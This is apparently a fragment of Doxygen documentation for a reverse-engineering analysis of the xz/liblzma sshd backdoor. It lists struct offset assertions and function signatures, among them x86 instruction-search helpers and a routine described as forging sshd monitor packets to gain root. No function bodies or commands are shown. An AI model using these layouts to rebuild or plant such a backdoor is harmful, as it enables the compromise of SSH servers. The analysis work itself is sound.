<tr class="memitem:ab4c12611169203b9cae01298a036c843"><td class="memItemLeft" align="right" valign="top"><a id="ab4c12611169203b9cae01298a036c843"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#ac0c8a0430fa3d00804d08b800bfdfc5d">monitor_data_t</a>, rsa, 0x30)</td></tr>
<tr class="separator:ab4c12611169203b9cae01298a036c843"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a12662497d5e98feadfdcea9261db7ec3"><td class="memItemLeft" align="right" valign="top"><a id="a12662497d5e98feadfdcea9261db7ec3"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, body_size, 0)</td></tr>
<tr class="separator:a12662497d5e98feadfdcea9261db7ec3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad3c748b0f5c21bdd202d32a88cd2a6c3"><td class="memItemLeft" align="right" valign="top"><a id="ad3c748b0f5c21bdd202d32a88cd2a6c3"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, p_do_orig, 8)</td></tr>
<tr class="separator:ad3c748b0f5c21bdd202d32a88cd2a6c3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5c7a0a6e4463550dc557baccfe73579b"><td class="memItemLeft" align="right" valign="top"><a id="a5c7a0a6e4463550dc557baccfe73579b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, payload_size, 0x10)</td></tr>
<tr class="separator:a5c7a0a6e4463550dc557baccfe73579b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab8c40adb2fb3d63b6fc05a4854017281"><td class="memItemLeft" align="right" valign="top"><a id="ab8c40adb2fb3d63b6fc05a4854017281"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, hostkey_hash_offset, 0x18)</td></tr>
<tr class="separator:ab8c40adb2fb3d63b6fc05a4854017281"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2e0bba6079d49aa92743445a67467dc9"><td class="memItemLeft" align="right" valign="top"><a id="a2e0bba6079d49aa92743445a67467dc9"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, rsa, 0x20)</td></tr>
<tr class="separator:a2e0bba6079d49aa92743445a67467dc9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9ac23fc33e070830fe39385eaf57ca61"><td class="memItemLeft" align="right" valign="top"><a id="a9ac23fc33e070830fe39385eaf57ca61"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, ed448_key_ptr, 0x30)</td></tr>
<tr class="separator:a9ac23fc33e070830fe39385eaf57ca61"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad8d1065463e35d2d711b39740ec1ab10"><td class="memItemLeft" align="right" valign="top"><a id="ad8d1065463e35d2d711b39740ec1ab10"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, num_keys, 0x38)</td></tr>
<tr class="separator:ad8d1065463e35d2d711b39740ec1ab10"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae5472c59862ff3346922b38ad06d8f77"><td class="memItemLeft" align="right" valign="top"><a id="ae5472c59862ff3346922b38ad06d8f77"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, key_cur_idx, 0x44)</td></tr>
<tr class="separator:ae5472c59862ff3346922b38ad06d8f77"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a40bc1a763f191d3c4aa8803c419a7071"><td class="memItemLeft" align="right" valign="top"><a id="a40bc1a763f191d3c4aa8803c419a7071"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, key_prev_idx, 0x48)</td></tr>
<tr class="separator:a40bc1a763f191d3c4aa8803c419a7071"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad18a9b618d6880a87692d0c06e87a212"><td class="memItemLeft" align="right" valign="top"><a id="ad18a9b618d6880a87692d0c06e87a212"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, unk57, 0x57)</td></tr>
<tr class="separator:ad18a9b618d6880a87692d0c06e87a212"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a78458295a33474a6481e16e18dd6e5a3"><td class="memItemLeft" align="right" valign="top"><a id="a78458295a33474a6481e16e18dd6e5a3"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, u.keys.num_host_keys, 0x58)</td></tr>
<tr class="separator:a78458295a33474a6481e16e18dd6e5a3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a005edc7e447669e08b882dfe5264e214"><td class="memItemLeft" align="right" valign="top"><a id="a005edc7e447669e08b882dfe5264e214"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, u.keys.num_host_pubkeys, 0x60)</td></tr>
<tr class="separator:a005edc7e447669e08b882dfe5264e214"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3e1812cdd16ab5316abdbf1971a3d85d"><td class="memItemLeft" align="right" valign="top"><a id="a3e1812cdd16ab5316abdbf1971a3d85d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, u.keys.ed448_key, 0x68)</td></tr>
<tr class="separator:a3e1812cdd16ab5316abdbf1971a3d85d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8a82ee95dcebdf72455051fb6d9886ca"><td class="memItemLeft" align="right" valign="top"><a id="a8a82ee95dcebdf72455051fb6d9886ca"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, data, 0xA8)</td></tr>
<tr class="separator:a8a82ee95dcebdf72455051fb6d9886ca"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6b3eb74eafa6ead7c9cb91bcb406d189"><td class="memItemLeft" align="right" valign="top"><a id="a6b3eb74eafa6ead7c9cb91bcb406d189"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#aa5a220a495d161205ee770f8e7b360d5">run_backdoor_commands_data_t</a>, kctx, 0x308)</td></tr>
<tr class="separator:a6b3eb74eafa6ead7c9cb91bcb406d189"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac0e0e270f39e3bbb6ea6aca1ec2ef5b3"><td class="memItemLeft" align="right" valign="top"><a id="ac0e0e270f39e3bbb6ea6aca1ec2ef5b3"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a>, cpuid_random_symbol_got_offset, 0)</td></tr>
<tr class="separator:ac0e0e270f39e3bbb6ea6aca1ec2ef5b3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2722de50727bad809faaa9434ff0057c"><td class="memItemLeft" align="right" valign="top"><a id="a2722de50727bad809faaa9434ff0057c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a>, cpuid_got_index, 0x8)</td></tr>
<tr class="separator:a2722de50727bad809faaa9434ff0057c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aff72cca79305fdddb7b9e4c9220435b1"><td class="memItemLeft" align="right" valign="top"><a id="aff72cca79305fdddb7b9e4c9220435b1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a>, backdoor_init_stage2_got_offset, 0x10)</td></tr>
<tr class="separator:aff72cca79305fdddb7b9e4c9220435b1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa6f70bf34b2ca798ff98804347584dc9"><td class="memItemLeft" align="right" valign="top"><a id="aa6f70bf34b2ca798ff98804347584dc9"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__tls__get__addr__reloc__consts.html">backdoor_tls_get_addr_reloc_consts_t</a>, tls_get_addr_plt_offset, 0)</td></tr>
<tr class="separator:aa6f70bf34b2ca798ff98804347584dc9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afa52c8b137a12acb824f5dad8c6ea6bc"><td class="memItemLeft" align="right" valign="top"><a id="afa52c8b137a12acb824f5dad8c6ea6bc"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__tls__get__addr__reloc__consts.html">backdoor_tls_get_addr_reloc_consts_t</a>, tls_get_addr_random_symbol_got_offset, 0x8)</td></tr>
<tr class="separator:afa52c8b137a12acb824f5dad8c6ea6bc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9e8f0d09d060769a4859a75243017c11"><td class="memItemLeft" align="right" valign="top"><a id="a9e8f0d09d060769a4859a75243017c11"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__functions.html">elf_functions_t</a>, init_hook_functions, 0x8)</td></tr>
<tr class="separator:a9e8f0d09d060769a4859a75243017c11"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3aedc50c8768464ec6ed16cc394f0ab1"><td class="memItemLeft" align="right" valign="top"><a id="a3aedc50c8768464ec6ed16cc394f0ab1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__functions.html">elf_functions_t</a>, <a class="el" href="xzre_8h.html#a099c6531c0b9aaf2a3caf6b001fa5109">elf_symbol_get_addr</a>, 0x20)</td></tr>
<tr class="separator:a3aedc50c8768464ec6ed16cc394f0ab1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aefafdfd3500cfe18ff932b28f0e6b218"><td class="memItemLeft" align="right" valign="top"><a id="aefafdfd3500cfe18ff932b28f0e6b218"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__functions.html">elf_functions_t</a>, <a class="el" href="xzre_8h.html#a049328971f4e99ce954d5e0346fee6d7">elf_parse</a>, 0x30)</td></tr>
<tr class="separator:aefafdfd3500cfe18ff932b28f0e6b218"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a52e1f932fcefc9dba0d744c404a5a031"><td class="memItemLeft" align="right" valign="top"><a id="a52e1f932fcefc9dba0d744c404a5a031"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a>, allocator.alloc, 0x8)</td></tr>
<tr class="separator:a52e1f932fcefc9dba0d744c404a5a031"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a174cc5d1304b26c086e4550b05fa7cd6"><td class="memItemLeft" align="right" valign="top"><a id="a174cc5d1304b26c086e4550b05fa7cd6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a>, allocator.free, 0x10)</td></tr>
<tr class="separator:a174cc5d1304b26c086e4550b05fa7cd6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4c458908da84133d84c0eead58c1797f"><td class="memItemLeft" align="right" valign="top"><a id="a4c458908da84133d84c0eead58c1797f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a>, allocator.opaque, 0x18)</td></tr>
<tr class="separator:a4c458908da84133d84c0eead58c1797f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abd58a889b4860fcf419275ae124e8de6"><td class="memItemLeft" align="right" valign="top"><a id="abd58a889b4860fcf419275ae124e8de6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, start_addr, 0)</td></tr>
<tr class="separator:abd58a889b4860fcf419275ae124e8de6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab016be09a93fcb7db40cd0744c63759c"><td class="memItemLeft" align="right" valign="top"><a id="ab016be09a93fcb7db40cd0744c63759c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, end_addr, 0x8)</td></tr>
<tr class="separator:ab016be09a93fcb7db40cd0744c63759c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aba8cfbc7405ff8c0a18a5bd6707d9705"><td class="memItemLeft" align="right" valign="top"><a id="aba8cfbc7405ff8c0a18a5bd6707d9705"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, offset_to_match, 0x10)</td></tr>
<tr class="separator:aba8cfbc7405ff8c0a18a5bd6707d9705"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8dc020af30e1b8c031bd2ab82b77a8d2"><td class="memItemLeft" align="right" valign="top"><a id="a8dc020af30e1b8c031bd2ab82b77a8d2"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, output_register_to_match, 0x18)</td></tr>
<tr class="separator:a8dc020af30e1b8c031bd2ab82b77a8d2"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a902574f56850c3f1dfdc0dfdcc676716"><td class="memItemLeft" align="right" valign="top"><a id="a902574f56850c3f1dfdc0dfdcc676716"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, output_register, 0x20)</td></tr>
<tr class="separator:a902574f56850c3f1dfdc0dfdcc676716"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a68028c156f6f6901da995916996fe089"><td class="memItemLeft" align="right" valign="top"><a id="a68028c156f6f6901da995916996fe089"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, result, 0x28)</td></tr>
<tr class="separator:a68028c156f6f6901da995916996fe089"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a508d061d3b0f29eab0ac170f9197ed8f"><td class="memItemLeft" align="right" valign="top"><a id="a508d061d3b0f29eab0ac170f9197ed8f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, hooks, 0x30)</td></tr>
<tr class="separator:a508d061d3b0f29eab0ac170f9197ed8f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4bcac3889c4d2fff6294722e35ec4c09"><td class="memItemLeft" align="right" valign="top"><a id="a4bcac3889c4d2fff6294722e35ec4c09"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx_t</a>, <a class="el" href="structimported__funcs.html">imported_funcs</a>, 0x38)</td></tr>
<tr class="separator:a4bcac3889c4d2fff6294722e35ec4c09"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a60b93ed64ba904012e9fa9477e97a244"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a60b93ed64ba904012e9fa9477e97a244">sshd_proxy_elevate</a> (<a class="el" href="xzre_8h.html#ac0c8a0430fa3d00804d08b800bfdfc5d">monitor_data_t</a> *args, <a class="el" href="structglobal__context.html">global_context_t</a> *ctx)</td></tr>
<tr class="memdesc:a60b93ed64ba904012e9fa9477e97a244"><td class="mdescLeft">&#160;</td><td class="mdescRight">forges a new <code>MONITOR_REQ_KEYALLOWED</code> packet, and injects it into the server to gain root privileges through the sshd monitor.  <a href="xzre_8h.html#a60b93ed64ba904012e9fa9477e97a244">More...</a><br /></td></tr>
<tr class="separator:a60b93ed64ba904012e9fa9477e97a244"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6ad15241561f71f06020fb6f2649e6a3"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6ad15241561f71f06020fb6f2649e6a3">x86_dasm</a> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *ctx, u8 *code_start, u8 *code_end)</td></tr>
<tr class="memdesc:a6ad15241561f71f06020fb6f2649e6a3"><td class="mdescLeft">&#160;</td><td class="mdescRight">disassembles the given x64 code  <a href="xzre_8h.html#a6ad15241561f71f06020fb6f2649e6a3">More...</a><br /></td></tr>
<tr class="separator:a6ad15241561f71f06020fb6f2649e6a3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a41fada894916f4c67d59090ff57aead1"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a41fada894916f4c67d59090ff57aead1">find_call_instruction</a> (u8 *code_start, u8 *code_end, u8 *call_target, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx)</td></tr>
<tr class="memdesc:a41fada894916f4c67d59090ff57aead1"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds a call instruction  <a href="xzre_8h.html#a41fada894916f4c67d59090ff57aead1">More...</a><br /></td></tr>
<tr class="separator:a41fada894916f4c67d59090ff57aead1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aea85a14166f11bb956c7862c2a66571e"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aea85a14166f11bb956c7862c2a66571e">find_lea_instruction</a> (u8 *code_start, u8 *code_end, u64 displacement)</td></tr>
<tr class="memdesc:aea85a14166f11bb956c7862c2a66571e"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds a lea instruction  <a href="xzre_8h.html#aea85a14166f11bb956c7862c2a66571e">More...</a><br /></td></tr>
<tr class="separator:aea85a14166f11bb956c7862c2a66571e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a60c226501adb1a2d3213484f651ff23b"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a60c226501adb1a2d3213484f651ff23b">find_instruction_with_mem_operand</a> (u8 *code_start, u8 *code_end, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx, void *mem_address)</td></tr>
<tr class="memdesc:a60c226501adb1a2d3213484f651ff23b"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds a LEA or MOV instruction with an immediate memory operand  <a href="xzre_8h.html#a60c226501adb1a2d3213484f651ff23b">More...</a><br /></td></tr>
<tr class="separator:a60c226501adb1a2d3213484f651ff23b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6e76946a37fb256974942a542373e421"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6e76946a37fb256974942a542373e421">find_lea_instruction_with_mem_operand</a> (u8 *code_start, u8 *code_end, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx, void *mem_address)</td></tr>
<tr class="memdesc:a6e76946a37fb256974942a542373e421"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds a LEA instruction with an immediate memory operand  <a href="xzre_8h.html#a6e76946a37fb256974942a542373e421">More...</a><br /></td></tr>
<tr class="separator:a6e76946a37fb256974942a542373e421"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a683636baae409d1b74ea2c216e2ba107"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a683636baae409d1b74ea2c216e2ba107">find_add_instruction_with_mem_operand</a> (u8 *code_start, u8 *code_end, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx, void *mem_address)</td></tr>
<tr class="memdesc:a683636baae409d1b74ea2c216e2ba107"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds an ADD instruction with an immediate memory operand  <a href="xzre_8h.html#a683636baae409d1b74ea2c216e2ba107">More...</a><br /></td></tr>
<tr class="separator:a683636baae409d1b74ea2c216e2ba107"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae9718452d28f67f46d046c02c0125148"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#ae9718452d28f67f46d046c02c0125148">find_mov_lea_instruction</a> (u8 *code_start, u8 *code_end, BOOL is_64bit_operand, BOOL load_flag, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx)</td></tr>
<tr class="memdesc:ae9718452d28f67f46d046c02c0125148"><td class="mdescLeft">&#160;</td><td class="mdescRight">like <a class="el" href="xzre_8h.html#a3ab8cd040932beaf3ec377a753bfece0">find_mov_instruction</a>, but also considers LEA instructions  <a href="xzre_8h.html#ae9718452d28f67f46d046c02c0125148">More...</a><br /></td></tr>
<tr class="separator:ae9718452d28f67f46d046c02c0125148"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3ab8cd040932beaf3ec377a753bfece0"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a3ab8cd040932beaf3ec377a753bfece0">find_mov_instruction</a> (u8 *code_start, u8 *code_end, BOOL is_64bit_operand, BOOL load_flag, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx)</td></tr>
<tr class="memdesc:a3ab8cd040932beaf3ec377a753bfece0"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds a MOV instruction.  <a href="xzre_8h.html#a3ab8cd040932beaf3ec377a753bfece0">More...</a><br /></td></tr>
<tr class="separator:a3ab8cd040932beaf3ec377a753bfece0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1c8a36d89bf4e57077a56611e9aeb470"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a1c8a36d89bf4e57077a56611e9aeb470">find_instruction_with_mem_operand_ex</a> (u8 *code_start, u8 *code_end, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx, int opcode, void *mem_address)</td></tr>
<tr class="memdesc:a1c8a36d89bf4e57077a56611e9aeb470"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds an instruction with an immediate memory operand  <a href="xzre_8h.html#a1c8a36d89bf4e57077a56611e9aeb470">More...</a><br /></td></tr>
<tr class="separator:a1c8a36d89bf4e57077a56611e9aeb470"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a544d2cf67930e0fcd9f9ff37239a4c70"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a544d2cf67930e0fcd9f9ff37239a4c70">is_endbr64_instruction</a> (u8 *code_start, u8 *code_end, u32 low_mask_part)</td></tr>
<tr class="memdesc:a544d2cf67930e0fcd9f9ff37239a4c70"><td class="mdescLeft">&#160;</td><td class="mdescRight">Checks if the code between <code>code_start</code> and <code>code_end</code> is an endbr64 instruction.  <a href="xzre_8h.html#a544d2cf67930e0fcd9f9ff37239a4c70">More...</a><br /></td></tr>
<tr class="separator:a544d2cf67930e0fcd9f9ff37239a4c70"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a78aba1d370c6519777e637f1ed7b7c14"><td class="memItemLeft" align="right" valign="top">u8 *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a78aba1d370c6519777e637f1ed7b7c14">find_string_reference</a> (u8 *code_start, u8 *code_end, const char *str)</td></tr>
<tr class="memdesc:a78aba1d370c6519777e637f1ed7b7c14"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds an instruction that references the given string  <a href="xzre_8h.html#a78aba1d370c6519777e637f1ed7b7c14">More...</a><br /></td></tr>
<tr class="separator:a78aba1d370c6519777e637f1ed7b7c14"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6ac7b2035eee3a9ffcceee0f9290c2e1"><td class="memItemLeft" align="right" valign="top">u8 *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a6ac7b2035eee3a9ffcceee0f9290c2e1">elf_find_string_reference</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, EncodedStringId encoded_string_id, u8 *code_start, u8 *code_end)</td></tr>
<tr class="memdesc:a6ac7b2035eee3a9ffcceee0f9290c2e1"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds an instruction that references the given string  <a href="xzre_8h.html#a6ac7b2035eee3a9ffcceee0f9290c2e1">More...</a><br /></td></tr>
<tr class="separator:a6ac7b2035eee3a9ffcceee0f9290c2e1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aed0391d07e4413f5a13e1ec2940c94ea"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#aed0391d07e4413f5a13e1ec2940c94ea">find_reg2reg_instruction</a> (u8 *code_start, u8 *code_end, <a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *dctx)</td></tr>
<tr class="memdesc:aed0391d07e4413f5a13e1ec2940c94ea"><td class="mdescLeft">&#160;</td><td class="mdescRight">finds a reg2reg instruction  <a href="xzre_8h.html#aed0391d07e4413f5a13e1ec2940c94ea">More...</a><br /></td></tr>
<tr class="separator:aed0391d07e4413f5a13e1ec2940c94ea"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a81a6f3d01ea6057c942052321b92c533"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a81a6f3d01ea6057c942052321b92c533">find_function_prologue</a> (u8 *code_start, u8 *code_end, u8 **output, FuncFindType find_mode)</td></tr>
<tr class="memdesc:a81a6f3d01ea6057c942052321b92c533"><td class="mdescLeft">&#160;</td><td class="mdescRight">locates the function prologue  <a href="xzre_8h.html#a81a6f3d01ea6057c942052321b92c533">More...</a><br /></td></tr>
<tr class="separator:a81a6f3d01ea6057c942052321b92c533"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adb94193174339f9eae22428308d46c33"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#adb94193174339f9eae22428308d46c33">find_function</a> (u8 *code_start, void **func_start, void **func_end, u8 *search_base, u8 *code_end, FuncFindType find_mode)</td></tr>
<tr class="memdesc:adb94193174339f9eae22428308d46c33"><td class="mdescLeft">&#160;</td><td class="mdescRight">locates the function boundaries.  <a href="xzre_8h.html#adb94193174339f9eae22428308d46c33">More...</a><br /></td></tr>
<tr class="separator:adb94193174339f9eae22428308d46c33"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2bf5f1627236a90a54515265280e8354"><td class="memItemLeft" align="right" valign="top">BOOL&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a2bf5f1627236a90a54515265280e8354">elf_contains_vaddr</a> (<a class="el" href="structelf__info.html">elf_info_t</a> *<a class="el" href="structelf__info.html">elf_info</a>, void *vaddr, u64 size, u32 p_flags)</td></tr>
